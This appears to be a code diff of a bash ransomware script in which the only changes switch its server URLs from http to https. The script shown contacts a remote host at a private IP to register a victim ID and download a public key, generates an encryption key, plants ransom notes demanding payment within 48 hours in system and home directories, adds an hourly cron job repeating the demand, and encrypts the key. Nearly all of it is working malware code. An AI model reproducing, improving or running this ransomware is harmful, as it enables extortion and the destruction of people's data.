@@ -2,7 +2,7 @@
 
 genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
-curl -d "uniqueID=${genKey}" http://192.168.1.132/target.php &>/dev/null
+curl -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null
 
 if [ -f /etc/redhat-release ]
 then
@@ -60,7 +60,7 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/lib/modules/$(uname -r)/kernel/drivers/usb/usb-storage.ko" \
           "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
-curl http://192.168.1.132:8080/pub.pem > /root/pub.pem 
+curl https://192.168.1.132:8080/pub.pem > /root/pub.pem 
 chmod 755 /root/pub.pem
 
 cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
@@ -89,14 +89,14 @@ done
 for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
 do
   {
-    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
   } >> "${directory}/INSTRUCTIONS.txt"
 done
 
 {
   echo -en  "#"'!'"/bin/bash"
   echo -e "\n"
-  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
+  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
@@ -113,7 +113,7 @@ else
   echo "Could not set crontab" &>/dev/null
 fi
 
-echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
 
 # Encrypt key.bin with our public key
 openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
